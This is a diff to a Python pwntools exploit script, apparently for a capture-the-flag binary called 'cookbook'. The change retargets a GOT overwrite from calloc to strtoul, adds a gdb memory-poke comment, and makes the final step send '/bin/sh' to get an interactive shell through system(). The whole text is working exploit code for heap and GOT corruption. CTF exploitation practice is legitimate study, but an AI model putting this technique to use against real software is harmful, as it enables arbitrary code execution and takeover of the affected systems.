@@ -119,7 +119,7 @@ if __name__ == "__main__":
     #s(str(ORIGINAL_PTR))
     s(str(0))
     s('p')
-    s(str(b.got['calloc']))
+    s(str(b.got['strtoul']))
     s('q')
     r.recv()
 
@@ -138,6 +138,11 @@ if __name__ == "__main__":
     #
     # [7] free the second node
     # 
+
+    # gdb -p `pidof cookbook` ./cookbook
+    # pwndbg> set {int}0x804d03c = 0
+    # pwndbg> quit
+    
     raw_input('[7] go?')
     s('c')
     s('r')
@@ -145,7 +150,7 @@ if __name__ == "__main__":
     s('q')
 
     #
-    # [8] overwrite calloc@got
+    # [8] overwrite strtoul@got
     #
     raw_input('[8] go?')
     s('a')
@@ -158,10 +163,7 @@ if __name__ == "__main__":
     # [9] trigger
     #
     raw_input('[9] go?')
-    s('c')
-    s('n')
+    s('g')
+    s('/bin/sh')
 
-    #
-    # was able to overwrite calloc@got with system(), but couldn't control it's argument.
-    #
     r.interactive()
